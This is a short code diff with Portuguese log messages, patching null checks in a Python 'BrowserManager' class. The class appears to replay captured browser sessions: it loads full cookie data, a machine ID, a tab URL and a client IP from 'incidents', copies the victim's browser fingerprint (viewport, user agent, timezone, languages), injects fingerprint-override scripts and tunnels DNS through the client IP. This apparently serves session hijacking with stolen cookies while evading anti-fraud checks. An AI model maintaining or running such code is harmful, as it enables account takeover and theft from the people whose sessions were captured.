@@ -75,7 +75,7 @@ class BrowserManager:
             machine_id = incident.get("machine_id")
             target_url = incident.get("tab_url")
             cookies_raw = incident.get("full_cookie_data", [])
-            fingerprint = incident.get("browser_fingerprint", {})
+            fingerprint = incident.get("browser_fingerprint") or {}
             client_ip = incident.get("client_ip")
             
             print(f"[BrowserManager] Iniciando sessão para incidente {incident_id}")
@@ -114,7 +114,7 @@ class BrowserManager:
             }
             
             # Aplicar Screen Properties do fingerprint
-            if fingerprint.get('screen'):
+            if fingerprint and fingerprint.get('screen'):
                 screen = fingerprint['screen']
                 context_options['viewport'] = {
                     'width': screen.get('width', 1920),
@@ -127,7 +127,7 @@ class BrowserManager:
                 print(f"[BrowserManager] ⚠️ Usando viewport padrão (1280x720)")
             
             # Aplicar User Agent
-            if fingerprint.get('userAgent'):
+            if fingerprint and fingerprint.get('userAgent'):
                 context_options['user_agent'] = fingerprint['userAgent']
                 print(f"[BrowserManager] ✓ User Agent: {fingerprint['userAgent'][:60]}...")
             else:
@@ -135,7 +135,7 @@ class BrowserManager:
                 print(f"[BrowserManager] ⚠️ Usando User Agent padrão")
             
             # Aplicar Timezone
-            if fingerprint.get('timezone'):
+            if fingerprint and fingerprint.get('timezone'):
                 tz_name = fingerprint['timezone'].get('name', 'America/Sao_Paulo')
                 context_options['timezone_id'] = tz_name
                 langs = fingerprint.get('languages', {})
@@ -147,7 +147,7 @@ class BrowserManager:
             print(f"[BrowserManager] ✓ Contexto criado com fingerprint")
             
             # Injetar scripts para sobrescrever propriedades não-padrão
-            if fingerprint:
+            if fingerprint and isinstance(fingerprint, dict):
                 await self._inject_fingerprint_overrides(context, fingerprint)
             
             # Configurar túnel DNS se client_ip disponível
